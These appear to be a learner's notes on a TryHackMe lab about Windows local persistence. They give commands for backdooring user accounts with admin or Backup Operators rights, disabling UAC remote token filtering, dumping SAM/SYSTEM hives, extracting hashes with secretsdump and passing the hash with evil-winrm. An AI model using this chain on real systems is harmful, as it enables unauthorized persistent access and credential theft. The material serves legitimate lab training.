from: Windows Local Persistence - https://tryhackme.com/room/windowslocalpersistence ; Task 2 -  Tampering With Unprivileged Accounts

The idea here is to grant admin privileges to a regular user account that you have access to so that even if you lose access to the admin account you have compromised, you will maintain admin privileges.


------------------------------------------------------------------------
Assign Group Memberships
------------------------
Note: you need access with an account with administrator privileges to do the following commands; you also need to have access to the user accounts to which you are granting admin privileges.

Administrators Group
--------------------
C:\> net localgroup administrators <username> /add
- add an unprivileged user to the administrators group in order to give them administrative privileges

Backup Operators Group
----------------------
C:\> net localgroup "Backup Operators" <username> /add
- adding a user to this group, instead of Administrators may look less suspicious
- "Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially."
- the names of the read/write privileges that are assigned by default to those in the Backup Operators Group are:
* "SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place."
* "SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place."

In addition, the user will need to be added to the "Remote Management Users" group to be able to connect remotely using WinRM or the "Remote Desktop Users" group to be able to connect remotely using RDP. The commands are:

C:\> net localgroup "Remote Management Users" <username> /add
- add user to Remote Management Users (WinRM) group
- allows user to log in remotely to this machine using WinRM

C:\> net localgroup "Remote Desktop Users" <username> /add
- add user to Remote Desktop Users (RDP) group
- allows user to log in remotely to this machine using RDP

Note: even though the user has now been added to the Backup Operators group and one of the groups that allows remote access, if they log-in remotely (e.g. through WinRM) they will still not be able to access all files. This is because the "Backup Operators"  group is not enabled. A `whoami /groups` search would show:
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
The cause is UAC (User Access Control). It prevents local accounts from having ANY admin privileges when they are logging in remotely. This is called "LocalAccountTokenFilterPolicy". When using a GUI remote interface the option exists to them elevate privileges through the UAC. This option does not exist for a command line interface such as WinRM. In order to allow the user in the Backup Operators group to have all its prvileges when logging in remotely, change the the below registry key to 1 by giving the following command:
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
Now a `whoami /groups` search should show:
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group

After taking the above steps, the "Backup Operators" user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.

The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.
The commands are:
PS C:\> reg save hklm\system system.bak
PS C:\> reg save hklm\sam sam.bak
PS C:\> download system.bak
PS C:\> download sam.bak

The hashes can then be dumped from these files using secretsdump.py, as follows:
$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Evil-winrm can also be used to perform a Pass-the-hash attack with the Administrator accounts hash, thereby obtaining admin privileges:
$ evil-winrm -i <MACHINE_IP> -u Administrator -H <HASH>

Special Privileges and Security Descriptors

As discussed above in regards to the Backup Operators group the privileges:
* SeBackupPrivilege
* SeRestorePrivilege
will allow a user to read/write any system file no matter what DACL it has.
Assigning these privileges to a user no matter what group they are in will give that user those privileges.
[Here is a link to info on Windows OS privileges: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants]
If one has admin privileges, one can use the `secedit` command to add privileges to any user.
C:\Users\Administrator> secedit /export /cfg config.inf
# export the current config file to a temporary location to be edited
